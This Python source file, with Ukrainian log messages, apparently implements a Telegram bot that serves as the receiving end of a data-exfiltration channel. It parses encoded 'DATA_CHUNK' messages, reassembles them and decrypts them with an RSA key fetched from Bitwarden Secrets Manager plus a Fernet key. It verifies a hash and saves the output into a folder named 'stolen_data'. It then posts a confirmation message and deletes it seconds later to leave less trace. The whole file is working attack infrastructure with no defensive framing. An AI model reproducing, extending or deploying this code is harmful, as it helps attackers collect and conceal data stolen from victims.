import telebot
import base64
import time
import re
import hashlib
import os
from dotenv import load_dotenv, find_dotenv
from bitwarden_sdk import BitwardenClient, ClientSettings
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet

load_dotenv(find_dotenv())

TOKEN = os.getenv("TELEGRAM_TOKEN")
BWS_ACCESS_TOKEN = os.getenv("BWS_ACCESS_TOKEN")
SECRET_ID = os.getenv("SECRET_ID")

if not TOKEN or not BWS_ACCESS_TOKEN:
    print("[-] ПОМИЛКА: Не вдалося завантажити змінні з .env! Перевір файл.")
    exit()

bot = telebot.TeleBot(TOKEN)

def fetch_private_key_from_bws():
    print("[*] Авторизація в Bitwarden Secrets Manager...")
    try:
        client = BitwardenClient(ClientSettings(
            identity_url="https://identity.bitwarden.com",
            api_url="https://api.bitwarden.com"
        ))
        
        client.auth().login_access_token(BWS_ACCESS_TOKEN)
        
        secret = client.secrets().get(SECRET_ID)

        key = serialization.load_pem_private_key(
            secret.data.value.strip().encode(),
            password=None
        )
        print("[+] УСПІХ")
        return key
    except Exception as e:
        print(f"[-] КРИТИЧНА ПОМИЛКА: {e}")
        exit()

private_key = fetch_private_key_from_bws()

chunks_storage = {}

@bot.message_handler(content_types=['text'])
def handle_incoming_data(message):
    pattern = r"DATA_CHUNK\|([a-f0-9]+)\|(\d+)\|(\d+)\|([a-f0-9]+)\|([A-Za-z0-9+/=]+)"
    match = re.search(pattern, message.text)
    
    if match:
        try:
            file_id, idx, total, file_hash, chunk_data = match.groups()
            idx, total = int(idx), int(total)

            if file_id not in chunks_storage:
                chunks_storage[file_id] = {
                    'total': total, 
                    'chunks': {}, 
                    'expected_hash': file_hash
                }

            chunks_storage[file_id]['chunks'][idx] = chunk_data
            print(f"[*] Отримано шматок {idx + 1}/{total} (Файл: {file_id})")

            if len(chunks_storage[file_id]['chunks']) == total:
                print(f"[+] Всі частини файлу {file_id} отримано. Починаю дешифрування...")
                assemble_and_verify(file_id, message)

        except Exception as e:
            print(f"[-] Помилка обробки фрагмента: {e}")

def assemble_and_verify(file_id, message):
    try:
        file_info = chunks_storage[file_id]

        full_b64 = "".join(file_info['chunks'][i] for i in range(file_info['total']))
        encrypted_binary = base64.b64decode(full_b64)

        enc_aes_key = encrypted_binary[:256]
        enc_data = encrypted_binary[256:]
        aes_key = private_key.decrypt(
            enc_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(hashes.SHA256()), 
                algorithm=hashes.SHA256(), 
                label=None
            )
        )
        cipher_aes = Fernet(aes_key)
        decrypted_data = cipher_aes.decrypt(enc_data)
        actual_hash = hashlib.sha256(decrypted_data).hexdigest()
        
        if actual_hash == file_info['expected_hash']:
            print(f"[+++] SHA-256 ПІДТВЕРДЖЕНО: {actual_hash}")
            status_msg = "успішно (хеш збігається)"
        else:
            print(f"[!] УВАГА: Хеші не збігаються!")
            status_msg = "ПОМИЛКА (хеш не збігається!)"

        os.makedirs("stolen_data", exist_ok=True)
        save_path = os.path.join("stolen_data", f"recovered_{file_id}.txt")

        with open(save_path, "wb") as f:
            f.write(decrypted_data)

        print(f"[+] Файл збережено: {save_path}")
        
        confirm_text = f"я сервер. все отримав {status_msg}, дякую"
        confirm_msg = bot.send_message(message.chat.id, confirm_text)
        
        time.sleep(2)
        try:
            bot.delete_message(message.chat.id, confirm_msg.message_id)
        except:
            pass

        del chunks_storage[file_id]

    except Exception as e:
        print(f"[-] Помилка збірки файлу: {e}")

if __name__ == "__main__":
    print("[*] Сервер запущено. Чекаю на дані...")
    bot.polling(none_stop=True)
